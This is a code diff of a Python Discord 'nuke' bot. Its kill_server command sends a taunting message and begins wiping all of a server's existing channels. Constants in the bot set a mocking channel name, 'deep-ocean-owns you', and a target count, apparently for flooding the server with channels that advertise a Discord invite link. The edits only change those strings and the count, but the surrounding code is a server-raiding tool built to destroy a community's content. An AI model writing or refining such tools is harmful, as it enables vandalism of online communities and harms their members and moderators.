@@ -24,8 +24,8 @@ def keep_alive():
 # Configuration Constants
 TOKEN = os.getenv("DISCORD_TOKEN")
 INVITE_LINK = "https://discord.gg/ctrhRxSKsA"
-CHANNEL_NAME = "join-deep-ocean"
-TARGET_COUNT = 50
+CHANNEL_NAME = "deep-ocean-owns you😆"
+TARGET_COUNT = 67
 
 # Setup Bot Intents
 intents = discord.Intents.default()
@@ -54,7 +54,7 @@ async def kill_server(ctx, confirm: str = None):
         return
 
     guild = ctx.guild
-    await ctx.send("**Nukimg server please wait** POOR SERVER WHY NUKE IT")
+    await ctx.send("**Nuking server please wait** **POOR SERVER WHY NUKE IT** 😭✌️")
 
     # Phase 1: Wipe all existing channels
     deleted_count = 0
